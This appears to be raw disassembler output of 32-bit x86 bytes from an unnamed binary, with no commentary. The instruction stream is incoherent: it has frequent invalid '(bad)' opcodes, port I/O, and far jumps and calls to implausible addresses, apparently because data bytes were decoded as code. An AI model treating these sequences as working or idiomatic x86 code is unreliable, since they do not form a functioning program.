  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x5cce248d
  41bca4:	pushf  
  41bca5:	fidivr DWORD PTR [ecx]
  41bca7:	and    eax,0x1070001
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	push   edi
  41bcaf:	gs jne 0x41bd2b
  41bcb2:	cmp    DWORD PTR [ebx],esp
  41bcb4:	cld    
  41bcb5:	popa   
  41bcb6:	fmul   DWORD PTR [esi-0x4e]
  41bcb9:	dec    eax
  41bcba:	mov    ecx,DWORD PTR ds:0x47105bce
  41bcc0:	imul   esp,DWORD PTR [ecx+0x416e6c4f],0x4ed73812
  41bcca:	mov    al,0xa3
  41bccc:	inc    eax
  41bccd:	fcom   DWORD PTR [ebp+0x1129246e]
  41bcd3:	sbb    DWORD PTR [ecx+0x4d],0xe6b1f4c2
  41bcda:	sbb    eax,0xf3b2bd9f
  41bcdf:	enter  0xd9aa,0x97
  41bce3:	jne    0x41bd33
  41bce5:	or     eax,0x415fcff1
  41bceb:	(bad)  
  41bcec:	gs aaa 
  41bcee:	in     eax,dx
  41bcef:	add    ah,BYTE PTR [ebp+0x5571bdf9]
  41bcf5:	sbb    eax,0xad2e3b99
  41bcfa:	pop    ebx
  41bcfb:	std    
  41bcfc:	fimul  WORD PTR [edi+0xc]
  41bcff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd00:	cmp    BYTE PTR [eax+ecx*1+0x48],dh
  41bd04:	ins    DWORD PTR es:[edi],dx
  41bd05:	inc    edi
  41bd06:	mov    cl,0x13
  41bd08:	sbb    BYTE PTR [eax],bh
  41bd0a:	pop    ebx
  41bd0b:	or     al,0x5e
  41bd0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd0e:	imul   esi,DWORD PTR [eax+0x2fa5bd9a],0xffffffc0
  41bd15:	in     al,0xf5
  41bd17:	xor    BYTE PTR [ecx+0x4e4d1a61],dh
  41bd1d:	in     eax,dx
  41bd1e:	mov    eax,0x91b39cfc
  41bd23:	ss int 0xb0
  41bd26:	into   
  41bd27:	addr16 or al,0x3c
  41bd2a:	lods   al,BYTE PTR ds:[esi]
  41bd2b:	leave  
  41bd2c:	mov    ebp,ecx
  41bd2e:	cmp    cl,bh
  41bd30:	add    dh,bh
  41bd32:	jg     0x41bd7a
  41bd34:	mov    dh,0x1f
  41bd36:	xlat   BYTE PTR ds:[ebx]
  41bd37:	jbe    0x41bdb7
  41bd39:	jae    0x41bd25
  41bd3b:	popf   
  41bd3c:	mov    edx,0xfbe65963
  41bd41:	cmp    DWORD PTR [edx-0x77],edi
  41bd44:	or     eax,0xe0a909b9
  41bd49:	int    0x6f
  41bd4b:	inc    edi
  41bd4c:	add    eax,0x7e95da04
  41bd51:	dec    esp
  41bd52:	jno    0x41bd8d
  41bd54:	daa    
  41bd55:	hlt    
  41bd56:	(bad)  
  41bd58:	retf   
  41bd59:	dec    esi
  41bd5a:	push   ss
  41bd5b:	lds    ebp,FWORD PTR [esi-0x5d]
  41bd5e:	add    al,0x5d
  41bd60:	pop    ebp
  41bd61:	pusha  
  41bd62:	call   0x33a255d8
  41bd67:	sar    BYTE PTR ds:0xbd7c742f,cl
  41bd6d:	in     al,0xc5
  41bd6f:	pop    esp
  41bd70:	sub    al,0x87
  41bd72:	jae    0x41bd2c
  41bd74:	sub    dl,BYTE PTR [esi-0x53]
  41bd77:	mov    esp,0xf10be6b9
  41bd7c:	pop    esp
  41bd7d:	xchg   ebx,eax
  41bd7e:	push   edx
  41bd7f:	fidivr DWORD PTR [edx-0x61a05384]
  41bd85:	pusha  
  41bd86:	push   esi
  41bd87:	jp     0x41be08
  41bd89:	sbb    edx,DWORD PTR ds:0xe1214d3e
  41bd8f:	xor    BYTE PTR [ebx+ebx*4-0x7efb055b],dl
  41bd96:	or     al,0xef
  41bd98:	pop    es
  41bd99:	or     DWORD PTR ds:0x78bccfa5,esp
  41bd9f:	cmc    
  41bda0:	idiv   dh
  41bda2:	ret    
  41bda3:	fldenv [edi-0x7f8e4cc5]
  41bda9:	cbw    
  41bdab:	jne    0x41bde1
  41bdad:	in     eax,dx
  41bdae:	nop
  41bdaf:	stc    
  41bdb0:	push   ecx
  41bdb1:	cmc    
  41bdb2:	push   0x69
  41bdb4:	icebp  
	...
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	ins    DWORD PTR es:[edi],dx
  41be23:	push   esp
  41be24:	mov    ebx,0x126403f
  41be29:	add    BYTE PTR [edi],al
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    BYTE PTR [ebp+0x3698fd9],bh
  41be33:	cwde   
  41be34:	(bad)  
  41be35:	in     al,0xa4
  41be37:	sub    al,0xa4
  41be39:	adc    al,dl
  41be3b:	movups xmm1,xmm6
  41be3e:	inc    ebx
  41be3f:	cmp    cl,cl
  41be41:	jg     0x41be32
  41be43:	push   es
  41be44:	int3   
  41be45:	mov    dl,0xa6
  41be47:	mov    esi,0x911672b4
  41be4c:	mov    bl,0xb3
  41be4e:	in     al,0xcd
  41be50:	sub    DWORD PTR [eax-0x7d],0x4acf6234
  41be57:	or     dh,BYTE PTR [edx+0xe]
  41be5a:	sub    eax,0xdc0e75ab
  41be5f:	push   ebp
  41be60:	pop    DWORD PTR [edx+edi*1-0x21ad6e30]
  41be67:	in     al,0x7b
  41be69:	shr    DWORD PTR [ebx+edx*4-0x5a7a9d56],0x84
  41be71:	mov    BYTE PTR [eax+ebx*1+0x62],ah
  41be75:	ja     0x41bee5
  41be77:	cmp    eax,DWORD PTR [ebx+0x26730747]
  41be7d:	inc    edx
  41be7e:	jp     0x41be96
  41be80:	les    ecx,FWORD PTR [edi-0x661c5444]
  41be86:	hlt    
  41be87:	mov    ch,0x39
  41be89:	cmp    al,0x44
  41be8b:	and    al,0xa7
  41be8d:	pop    esi
  41be8e:	cli    
  41be8f:	dec    eax
  41be90:	pop    ecx
  41be91:	push   edx
  41be92:	fdivr  DWORD PTR [esi-0x5ee22e95]
  41be98:	sahf   
  41be99:	das    
  41be9a:	dec    edx
  41be9b:	shl    esi,1
  41be9d:	jle    0x41beac
  41be9f:	test   eax,0xad9a6f5a
  41bea4:	xor    BYTE PTR [edx],cl
  41bea6:	push   ebx
  41bea7:	add    BYTE PTR [esi+0x5ad166ba],ch
  41bead:	jl     0x41be64
  41beaf:	fxch   st(3)
  41beb1:	(bad)  
  41beb2:	mov    esi,0x7e50fa54
  41beb7:	into   
  41beb8:	adc    ebp,ecx
  41beba:	jmp    0x78d7051f
  41bebf:	pop    eax
  41bec0:	cmp    eax,0xeb9cb1b1
  41bec5:	and    ebp,DWORD PTR ds:0xec329d92
  41becb:	mov    DWORD PTR [eax],edx
  41becd:	adc    al,0x4e
  41becf:	mov    ds:0x8e64f156,al
  41bed4:	push   esi
  41bed5:	xchg   edi,eax
  41bed6:	lahf   
  41bed7:	pop    ebp
  41bed8:	out    dx,al
  41bed9:	jmp    0x41bea1
  41bedb:	cmc    
  41bedc:	lds    ebx,FWORD PTR [edi-0xa]
  41bedf:	(bad)  
  41bee2:	aam    0x22
  41bee4:	and    eax,0xb1d84a17
  41bee9:	sub    ebx,DWORD PTR [edx-0x24838e14]
  41beef:	inc    ebx
  41bef0:	sbb    ebp,0x5e48da14
  41bef6:	pop    edi
  41bef7:	mov    ds:0x759dcec9,eax
  41befc:	mov    bh,0xa5
  41befe:	imul   edi,DWORD PTR [esi-0x11],0xffffff98
  41bf02:	sub    ebp,edx
  41bf04:	pop    es
  41bf05:	adc    DWORD PTR [edx+0x49e0573d],ebx
  41bf0b:	sub    ch,al
  41bf0d:	(bad)  
  41bf0e:	fst    QWORD PTR [eax-0x1fe2232f]
  41bf14:	jns    0x41beae
  41bf16:	mov    al,ds:0x20ed6e0b
  41bf1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf1c:	mov    esp,0x1a10ba7d
  41bf21:	cmp    DWORD PTR [edi+0x71],esp
  41bf24:	repz mov al,ds:0xc5aeaa37
  41bf2a:	jl     0x41bf9f
  41bf2c:	xchg   edx,eax
  41bf2d:	or     al,BYTE PTR [esi]
  41bf2f:	sbb    BYTE PTR [ebx+0x3b],ah
  41bf32:	in     eax,0xe3
  41bf34:	lahf   
	...
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	ins    DWORD PTR es:[edi],dx
  41bfa3:	das    
  41bfa4:	ds dec edi
  41bfa6:	inc    edi
  41bfa7:	daa    
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [ebx+0x7d540c81],ah
  41bfb3:	aaa    
  41bfb4:	jle    0x41bfc6
  41bfb6:	push   ebp
  41bfb7:	icebp  
  41bfb8:	imul   esp,DWORD PTR [edi-0xd05bb41],0xb3feb678
  41bfc2:	dec    ebx
  41bfc3:	pop    ss
  41bfc4:	dec    ebp
  41bfc5:	clc    
  41bfc6:	adc    eax,0x3a6848f9
  41bfcb:	outs   dx,DWORD PTR ds:[esi]
  41bfcc:	sahf   
  41bfcd:	jle    0x41c01c
  41bfcf:	add    ch,BYTE PTR [ebx]
  41bfd1:	sahf   
  41bfd2:	inc    ebx
  41bfd3:	es ja  0x41bf90
  41bfd6:	stos   BYTE PTR es:[edi],al
  41bfd7:	push   esp
  41bfd8:	popa   
  41bfd9:	mov    BYTE PTR [esi],bh
  41bfdb:	mov    eax,0xb86eb70e
  41bfe0:	and    dh,BYTE PTR [eax+ecx*4-0x69]
  41bfe4:	rcr    DWORD PTR [esi+0x1a],cl
  41bfe7:	xchg   edi,eax
  41bfe8:	add    eax,esp
  41bfea:	mov    ds:0x66701436,eax
  41bfef:	ja     0x41bf98
  41bff1:	sbb    ah,dh
  41bff3:	je     0x41bf8b
  41bff5:	scas   al,BYTE PTR es:[edi]
  41bff6:	xor    edx,esp
  41bff8:	sub    al,0x37
  41bffa:	fcmovnb st,st(2)
  41bffc:	inc    edi
  41bffd:	xor    ch,bh
  41bfff:	scas   eax,DWORD PTR es:[edi]
  41c000:	mov    BYTE PTR [ebx-0x45b17bd3],bh
  41c006:	rcl    BYTE PTR [edi+ebx*1-0x28],0x73
  41c00b:	shr    DWORD PTR [ecx],1
  41c00d:	mov    dh,0xcf
  41c00f:	cdq    
  41c010:	fnstsw WORD PTR [edx+0x23a56777]
  41c016:	sbb    al,0x65
  41c018:	int3   
  41c019:	test   DWORD PTR [ecx],ecx
  41c01b:	ret    
  41c01c:	test   eax,0xf95314a4
  41c021:	or     eax,DWORD PTR [ebp-0x287a4664]
  41c027:	mov    dl,0xcb
  41c029:	popa   
  41c02a:	in     al,0xf2
  41c02c:	push   ebx
  41c02d:	fdiv   st(3),st
  41c02f:	push   cs
  41c030:	inc    edi
  41c031:	rcr    BYTE PTR [eax+ecx*8+0x68e9c386],0x5f
  41c039:	mov    ebp,0x7d2e2182
  41c03e:	(bad)  
  41c03f:	jge    0x41c0b0
  41c041:	inc    ebx
  41c042:	out    0xe7,eax
  41c044:	inc    esi
  41c045:	adc    esi,ebp
  41c047:	aam    0x64
  41c049:	mov    ds:0xc57a2ff2,eax
  41c04e:	stos   BYTE PTR es:[edi],al
  41c04f:	ds js  0x41c059
  41c052:	and    esp,DWORD PTR [ebx-0x12]
  41c055:	and    esp,DWORD PTR [edi-0x2c9fcc5e]
  41c05b:	cmc    
  41c05c:	add    ebp,DWORD PTR es:[ecx-0x35]
  41c060:	xchg   ecx,eax
  41c061:	iret   
  41c062:	retf   
  41c063:	xor    eax,0x93d52fef
  41c068:	dec    edx
  41c069:	fwait
  41c06a:	pop    es
  41c06b:	icebp  
  41c06c:	data16 and dh,BYTE PTR [eax]
  41c06f:	retf   
  41c070:	shr    DWORD PTR fs:0x93879b51,1
  41c077:	clc    
  41c078:	ret    0x5cd0
  41c07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c07c:	pop    eax
  41c07d:	push   0xa6da9d8e
  41c082:	lods   al,BYTE PTR ds:[esi]
  41c083:	fidivr WORD PTR [ecx+0xafe947a]
  41c089:	push   ss
  41c08a:	xchg   esi,eax
  41c08b:	adc    eax,0xd5433575
  41c090:	lahf   
  41c091:	lahf   
  41c092:	ret    0xfa1d
  41c095:	data16 cli 
  41c097:	sbb    al,0xaf
  41c099:	fisttp QWORD PTR ds:0x90c4a203
  41c09f:	push   edi
  41c0a0:	call   0x2a11:0xa095c2ae
  41c0a7:	push   eax
  41c0a8:	js     0x41c0d5
  41c0aa:	cmp    BYTE PTR [ebx+0x5d],bl
  41c0ad:	inc    ebx
  41c0ae:	mov    al,ds:0xd6125217
  41c0b3:	jns    0x41c071
	...
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	fistp  QWORD PTR [esi]
  41c124:	in     eax,0xa2
  41c126:	dec    esi
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [esi+0x6d9ffc43],dl
  41c133:	xor    ebx,ebp
  41c135:	aam    0x8f
  41c137:	into   
  41c138:	mov    DWORD PTR [eax+0x425ef1e1],0xdd4e3afb
  41c142:	push   esi
  41c143:	test   DWORD PTR ds:0xd694728a,edx
  41c149:	test   BYTE PTR ds:0x97003254,cl
  41c14f:	adc    al,0x60
  41c151:	or     DWORD PTR [esi-0x7],ebp
  41c154:	push   esp
  41c155:	clc    
  41c156:	adc    eax,0xf26161b1
  41c15b:	aas    
  41c15c:	sbb    al,0x9c
  41c15e:	retf   
  41c15f:	nop
  41c160:	pop    ds
  41c161:	sar    ecx,1
  41c163:	sahf   
  41c164:	leave  
  41c165:	iret   
  41c166:	and    DWORD PTR [edx+0x40],ebx
  41c169:	jl     0x41c16b
  41c16b:	inc    esi
  41c16c:	rcr    DWORD PTR [edx-0x40],cl
  41c16f:	data16 jo 0x41c1d6
  41c172:	sar    ebx,cl
  41c174:	test   DWORD PTR [esi-0x818bcc7],ebp
  41c17a:	sbb    al,0x24
  41c17c:	xchg   ebp,eax
  41c17d:	pop    ss
  41c17e:	or     BYTE PTR ds:0xd8f3a89d,0x97
  41c185:	call   0xd0e371bd
  41c18a:	sub    eax,0x33f81ab8
  41c18f:	adc    al,0x77
  41c191:	sbb    eax,0xf56073d2
  41c196:	int3   
  41c197:	fwait
  41c198:	call   0xa16d:0x903997a3
  41c19f:	daa    
  41c1a0:	cmp    DWORD PTR [eax+0x15],0xbc584d74
  41c1a7:	xor    al,0x21
  41c1a9:	push   ss
  41c1aa:	adc    BYTE PTR [ebx],cl
  41c1ac:	push   0x2baed897
  41c1b1:	sub    eax,0xb386a4ee
  41c1b6:	rol    BYTE PTR [eax],1
  41c1b8:	mov    bh,al
  41c1ba:	inc    eax
  41c1bb:	mov    DWORD PTR [eax-0x79],esp
  41c1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1bf:	sahf   
  41c1c0:	pop    es
  41c1c1:	pop    es
  41c1c2:	xor    eax,0xcb54b8a3
  41c1c7:	add    BYTE PTR [eax],0xa0
  41c1ca:	or     al,0x68
  41c1cc:	pushf  
  41c1cd:	push   ds
  41c1ce:	fstp   st(5)
  41c1d0:	mov    eax,0x637cd7ab
  41c1d5:	push   ecx
  41c1d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1d7:	setno  BYTE PTR [esi-0x69]
  41c1db:	push   ds
  41c1dc:	loopne 0x41c22f
  41c1de:	and    al,bl
  41c1e0:	pop    ss
  41c1e1:	(bad)  
  41c1e2:	bound  ebx,QWORD PTR [ebp-0x54]
  41c1e5:	xlat   BYTE PTR ds:[ebx]
  41c1e6:	or     al,0x7c
  41c1e8:	stos   BYTE PTR es:[edi],al
  41c1e9:	xor    esi,DWORD PTR [esi+0x52a4bc2a]
  41c1ef:	mov    ds:0xc9e1546d,al
  41c1f4:	sub    al,0xdd
  41c1f6:	push   ecx
  41c1f7:	sbb    bh,bh
  41c1f9:	mov    edi,0x941e8950
  41c1fe:	inc    ebp
  41c1ff:	stos   DWORD PTR es:[edi],eax
  41c200:	sub    DWORD PTR [ebx-0x10],0xf
  41c204:	aas    
  41c205:	xor    eax,0xee70e78a
  41c20a:	mov    eax,0x9151e3aa
  41c20f:	sbb    al,0x16
  41c211:	pop    es
  41c212:	xchg   ebp,eax
  41c213:	stos   BYTE PTR es:[edi],al
  41c214:	enter  0x7317,0x1f
  41c218:	push   esp
  41c219:	xchg   esi,eax
  41c21a:	test   bl,ah
  41c21c:	fst    QWORD PTR [ebp+0x1e]
  41c21f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41c221:	jmp    0x6d4:0x631ddda7
  41c228:	(bad)
  41c22b:	push   ds
  41c22c:	push   ebp
  41c22d:	loope  0x41c250
  41c22f:	in     al,dx
  41c230:	mov    eax,ds:0xb10ab32b
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	(bad)  
  41c2a3:	or     eax,0x2955a4ae
  41c2a8:	add    DWORD PTR [eax],eax
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [edi-0x9],ah
  41c2b0:	ins    BYTE PTR es:[edi],dx
  41c2b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2b2:	sub    DWORD PTR [edx],edx
  41c2b4:	jmp    0x8156fc22
  41c2b9:	add    ebp,DWORD PTR [ebp-0x34]
  41c2bc:	popf   
  41c2bd:	or     eax,0xcb476fb5
  41c2c2:	out    0xac,al
  41c2c4:	inc    eax
  41c2c5:	popa   
  41c2c6:	stc    
  41c2c7:	inc    edi
  41c2c8:	and    eax,0x18d0f327
  41c2cd:	pop    ds
  41c2ce:	(bad)  
  41c2cf:	sar    dh,0x91
  41c2d2:	adc    dh,BYTE PTR [ecx]
  41c2d4:	in     al,dx
  41c2d5:	outs   dx,BYTE PTR ds:[esi]
  41c2d6:	aad    0x8d
  41c2d8:	cs push esi
  41c2da:	std    
  41c2db:	xchg   esp,eax
  41c2dc:	push   cs
  41c2dd:	xchg   ebp,eax
  41c2de:	jg     0x41c2a8
  41c2e0:	inc    edx
  41c2e1:	pop    ss
  41c2e2:	iret   
  41c2e3:	(bad)
  41c2e6:	aas    
  41c2e7:	inc    eax
  41c2e8:	imul   eax,edi,0xc4c523be
  41c2ee:	(bad)  
  41c2ef:	(bad)  
  41c2f1:	arpl   WORD PTR [ecx-0x27347da0],bx
  41c2f7:	nop
  41c2f8:	add    eax,0xfd538430
  41c2fd:	lea    edi,[ebx+0x5c]
  41c300:	add    BYTE PTR [esi],ch
  41c302:	and    ecx,esp
  41c304:	pop    ds
  41c305:	adc    eax,DWORD PTR [ebx+0xaf36d44]
  41c30b:	jp     0x41c2ef
  41c30d:	mov    ecx,0xc8e86a25
  41c312:	jne    0x41c325
  41c314:	dec    ebx
  41c315:	rol    BYTE PTR [ebx],cl
  41c317:	daa    
  41c318:	mov    eax,ds:0x245f164b
  41c31d:	not    ch
  41c31f:	ds pop esi
  41c321:	and    al,0xd3
  41c323:	mov    eax,DWORD PTR [eax+0x3d]
  41c326:	stc    
  41c327:	jbe    0x41c359
  41c329:	adc    al,0x9e
  41c32b:	add    esi,esi
  41c32d:	pop    ebp
  41c32e:	mov    ds:0x108464f0,eax
  41c333:	xchg   ebp,eax
  41c334:	mov    dh,0x70
  41c336:	push   ebx
  41c337:	jecxz  0x41c392
  41c339:	adc    al,0x39
  41c33b:	loopne 0x41c318
  41c33d:	fsubr  st,st(3)
  41c33f:	xchg   bl,cl
  41c341:	imul   edi,DWORD PTR [edx+edi*8-0x3],0x449e63b1
  41c349:	aas    
  41c34a:	inc    eax
  41c34b:	iret   
  41c34c:	inc    eax
  41c34d:	push   eax
  41c34e:	sbb    DWORD PTR [ebp+0xa],ebx
  41c351:	popa   
  41c352:	and    cl,BYTE PTR es:[edi+0x30125c86]
  41c359:	xlat   BYTE PTR ds:[ebx]
  41c35a:	lds    edx,FWORD PTR [ecx]
  41c35c:	push   esp
  41c35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c35e:	cmp    eax,0xe2f55296
  41c363:	push   ebx
  41c364:	or     DWORD PTR [edx],edx
  41c366:	lahf   
  41c367:	push   es
  41c368:	aas    
  41c369:	mov    cl,0x16
  41c36b:	lods   eax,DWORD PTR ds:[esi]
  41c36c:	dec    esi
  41c36d:	xor    BYTE PTR [esi-0x2d],bl
  41c370:	inc    esi
  41c371:	arpl   bp,ax
  41c373:	retf   0xbb9c
  41c376:	ret    0xed4b
  41c379:	push   0x22cde79b
  41c37e:	push   ecx
  41c37f:	fnstsw WORD PTR [edx+ebp*1]
  41c382:	fadd   DWORD PTR [esi]
  41c384:	xor    al,0xd9
  41c386:	inc    edi
  41c387:	inc    ebx
  41c388:	sbb    al,0x1c
  41c38a:	into   
  41c38b:	sub    DWORD PTR [ebp+0x578bb016],edx
  41c391:	imul   edx,DWORD PTR [edx+0x65],0x96e2bbb
  41c398:	add    DWORD PTR [ecx],0xfffffff7
  41c39b:	ins    DWORD PTR es:[edi],dx
  41c39c:	jecxz  0x41c39d
  41c39e:	lea    ecx,[esp+eiz*2]
  41c3a1:	fisttp QWORD PTR [edx]
  41c3a3:	xor    dl,dh
  41c3a5:	jle    0x41c3ca
  41c3a7:	fnsave [eax-0x5cce31b5]
  41c3ad:	mov    ebp,0x266ce571
  41c3b2:	xchg   ebp,eax
  41c3b3:	pop    edi
  41c3b4:	or     eax,0x0
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+ecx*2-0x6e]
  41c424:	jle    0x41c476
  41c426:	pop    esp
  41c427:	sub    al,BYTE PTR [ecx]
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    cl,bl
  41c42f:	fiadd  WORD PTR [ebp-0x3e]
  41c432:	xor    ah,0xcb
  41c435:	stos   BYTE PTR es:[edi],al
  41c436:	loope  0x41c3de
  41c438:	jae    0x41c46f
  41c43a:	mov    dl,0x27
  41c43c:	mov    bh,0xf8
  41c43e:	mov    esi,0x9a0bcbb1
  41c443:	dec    eax
  41c444:	xchg   ebp,eax
  41c445:	mov    dh,0xb6
  41c447:	push   0x49
  41c449:	jbe    0x41c3e9
  41c44b:	mov    esi,0x2b3377d
  41c450:	push   eax
  41c451:	push   ebp
  41c452:	dec    eax
  41c453:	sub    al,0x93
  41c455:	pop    ss
  41c456:	jmp    0xf771:0xff7ddb18
  41c45d:	sbb    BYTE PTR [eiz*2-0x5235364c],dh
  41c464:	push   cs
  41c465:	loopne 0x41c450
  41c467:	pop    ebp
  41c468:	push   esp
  41c469:	xor    eax,0x27b19be1
  41c46e:	mov    ah,0x20
  41c470:	rol    cl,cl
  41c472:	in     eax,0xd1
  41c474:	xlat   BYTE PTR ds:[ebx]
  41c475:	and    DWORD PTR [ecx-0x3b5e359],ebp
  41c47b:	jge    0x41c445
  41c47d:	rol    ah,0x40
  41c480:	lods   al,BYTE PTR ds:[esi]
  41c481:	outs   dx,BYTE PTR ds:[esi]
  41c482:	adc    ebx,DWORD PTR [eax]
  41c484:	call   0x8475a9ff
  41c489:	push   ebx
  41c48a:	sbb    BYTE PTR [edx-0x26bb84fc],al
  41c490:	mov    dh,0x16
  41c492:	sbb    ch,ah
  41c494:	mov    ch,0xcf
  41c496:	jge    0x41c419
  41c498:	fnstenv [edx-0x4419eebf]
  41c49e:	jbe    0x41c4df
  41c4a0:	xchg   esi,eax
  41c4a1:	or     DWORD PTR [esi],ebp
  41c4a3:	outs   dx,BYTE PTR ds:[esi]
  41c4a4:	mov    al,ds:0x17fe0824
  41c4a9:	jnp    0x41c4ae
  41c4ab:	or     al,0x61
  41c4ad:	or     al,0xd1
  41c4af:	fwait
  41c4b0:	xor    ebx,edi
  41c4b2:	ror    eax,cl
  41c4b4:	xor    ebx,edx
  41c4b6:	push   ebx
  41c4b7:	cmp    DWORD PTR [esi-0x4b],esi
  41c4ba:	add    eax,0x3a4e8f2c
  41c4bf:	adc    eax,0x1a8fefbb
  41c4c4:	fidivr WORD PTR [ebx+0xcfd7b61]
  41c4ca:	and    DWORD PTR [edx],0x84370476
  41c4d0:	in     al,dx
  41c4d1:	into   
  41c4d2:	daa    
  41c4d3:	adc    dh,BYTE PTR [eax+0x3b]
  41c4d6:	rol    bh,cl
  41c4d8:	jmp    0x2aa2da7
  41c4dd:	sbb    al,0x20
  41c4df:	jmp    0x41c520
  41c4e1:	add    bl,ch
  41c4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4e4:	dec    esi
  41c4e5:	mov    WORD PTR [edi+0x4c],fs
  41c4e8:	push   esi
  41c4e9:	int    0x74
  41c4eb:	fisubr DWORD PTR [ebx+0x49b74e4f]
  41c4f1:	dec    ecx
  41c4f2:	(bad)  
  41c4f3:	fdivr  st,st(1)
  41c4f5:	out    dx,eax
  41c4f6:	mov    esi,ss
  41c4f8:	fcom   DWORD PTR [esi+edx*2]
  41c4fb:	xor    ah,BYTE PTR [eax-0x1d446b98]
  41c501:	xor    BYTE PTR [edx+ecx*2-0x3a],bl
  41c505:	pop    ecx
  41c506:	push   0x41a4013f
  41c50b:	stos   DWORD PTR es:[edi],eax
  41c50c:	fist   WORD PTR ss:[edi+0xb09c3aa]
  41c513:	mov    BYTE PTR [edi+0x38583286],cl
  41c519:	mov    dh,0xe5
  41c51b:	jl     0x41c52d
  41c51d:	mov    edx,0x473445d4
  41c522:	push   eax
  41c523:	pop    ecx
  41c524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c525:	xor    ebx,0xc185244b
  41c52b:	inc    ebp
  41c52c:	cmp    esi,esp
  41c52e:	sub    eax,0x5a890bd3
  41c533:	and    cl,BYTE PTR ds:0x0
	...
  41c595:	add    ch,al
  41c597:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c59d:	jecxz  0x41c5b9
  41c59f:	push   0x10
  41c5a1:	stc    
  41c5a2:	add    eax,ecx
  41c5a4:	(bad)  
  41c5a5:	repnz arpl WORD PTR [ebx],bp
  41c5a8:	add    DWORD PTR [eax],eax
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    dl,bh
  41c5af:	jmp    0x41c61b
  41c5b1:	sub    al,0x5a
  41c5b3:	sbb    ebx,DWORD PTR [eax-0xbfab415]
  41c5b9:	ins    DWORD PTR es:[edi],dx
  41c5ba:	int    0xa2
  41c5bc:	fst    DWORD PTR [ebp+eiz*8+0x20]
  41c5c0:	bound  esi,QWORD PTR [edx-0x1bd56f98]
  41c5c6:	mov    ebx,0x786f088a
  41c5cb:	add    ebx,eax
  41c5cd:	pop    DWORD PTR [ecx+edx*4]
  41c5d0:	(bad)  
  41c5d1:	enter  0xcc59,0xbd
  41c5d5:	rcl    DWORD PTR [eax+0x75],cl
  41c5d8:	test   al,0xbb
  41c5da:	outs   dx,BYTE PTR ds:[esi]
  41c5db:	dec    eax
  41c5dc:	pushf  
  41c5dd:	mov    ebx,0x6bde6ba7
  41c5e2:	and    al,0x1c
  41c5e4:	lods   eax,DWORD PTR ds:[esi]
  41c5e5:	mov    al,ds:0x52695ff7
  41c5ea:	cmp    ebx,DWORD PTR [esi]
  41c5ec:	out    dx,eax
  41c5ed:	push   esp
  41c5ee:	sub    ebx,DWORD PTR [eax]
  41c5f0:	or     bl,BYTE PTR [edx-0x47319c19]
  41c5f6:	dec    eax
  41c5f7:	jge    0x41c66c
  41c5f9:	mov    cl,0x8f
  41c5fb:	push   edi
  41c5fc:	fstp   TBYTE PTR [ebx+0x4]
  41c5ff:	ret    
  41c600:	pop    ds
  41c601:	and    al,0x14
  41c603:	rol    bh,1
  41c605:	outs   dx,BYTE PTR ds:[esi]
  41c606:	dec    ecx
  41c607:	jbe    0x41c5f6
  41c609:	mov    ebx,0xb0c7ce4e
  41c60e:	mov    al,ds:0xc597d567
  41c613:	pusha  
  41c614:	mov    ecx,0xa2ff5ea5
  41c619:	xlat   BYTE PTR ds:[ebx]
  41c61a:	mov    eax,ds:0x8b4cb748
  41c61f:	enter  0x30eb,0xf3
  41c623:	add    BYTE PTR [ebp-0x50b487eb],ah
  41c629:	aas    
  41c62a:	lock push edx
  41c62c:	xchg   edi,eax
  41c62d:	dec    ebx
  41c62e:	dec    ecx
  41c62f:	daa    
  41c630:	mov    ecx,0xded0728
  41c635:	jl     0x41c6b6
  41c637:	pushw  0xfff9
  41c63a:	pop    edi
  41c63b:	fidiv  WORD PTR [ebp+0x30]
  41c63e:	mov    eax,0x1b8fae8d
  41c643:	push   ebx
  41c644:	sub    dh,BYTE PTR [edi-0xc37ef1e]
  41c64a:	and    al,0xa8
  41c64c:	call   0x5af12b43
  41c651:	std    
  41c652:	or     DWORD PTR ds:0xa10ae9c,ebx
  41c658:	jmp    0x41c66e
